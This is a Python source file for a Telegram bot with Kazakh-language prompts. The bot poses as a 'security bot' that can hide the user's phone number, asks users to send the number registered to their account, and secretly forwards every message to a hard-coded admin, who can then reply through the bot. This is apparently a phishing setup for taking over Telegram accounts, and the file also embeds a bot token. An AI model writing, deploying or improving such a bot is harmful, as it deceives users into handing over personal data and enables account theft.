import logging
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from keep_alive import keep_alive

BOT_TOKEN = "8761711302:AAHVG8YbgwNbDZ2wsCVCd5qkelKEtILeroo"
ADMIN_ID = 5267146792

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

user_state = {}
forwarded_map = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Қош келдіңіз! Боттың барлық мүмкіндіктерін пайдалану үшін алдымен ресми каналымызға тіркеліңіз: @tigr0071\n\n"
        "Тіркелген болсаңыз, растау үшін \"1\" санын жіберіңіз."
    )
    user_state[update.effective_user.id] = "awaiting_confirmation"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = update.message.text if update.message.text else ""

    if user_id == ADMIN_ID:
        if update.message.reply_to_message:
            original_msg_id = update.message.reply_to_message.message_id
            target_user_id = forwarded_map.get(original_msg_id)
            if target_user_id:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=update.message.text,
                )
        return

    state = user_state.get(user_id, "start")

    if state == "awaiting_confirmation" and text.strip() == "1":
        user_state[user_id] = "awaiting_phone"
        await update.message.reply_text(
            "Рахмет! Тіркелу расталды. Мен қауіпсіздік ботымын. "
            "Аккаунтыңыздағы телефон нөміріңізді өзгелерге көрінбейтіндей етіп жасырып бере аламын. "
            "Ол үшін аккаунтқа тіркелген нөміріңізді жазыңыз."
        )

        forwarded = await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.message.chat_id,
            message_id=update.message.message_id,
        )
        forwarded_map[forwarded.message_id] = user_id

    elif state == "awaiting_phone":
        await update.message.reply_text(
            "Рахмет! Сұраныс қабылданды. Нөмір тексерілуде, 1-2 минут күтіңіз..."
        )
        user_state[user_id] = "done"

        forwarded = await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.message.chat_id,
            message_id=update.message.message_id,
        )
        forwarded_map[forwarded.message_id] = user_id

    else:
        forwarded = await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.message.chat_id,
            message_id=update.message.message_id,
        )
        forwarded_map[forwarded.message_id] = user_id


def main():
    keep_alive()

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))

    logger.info("Bot started.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
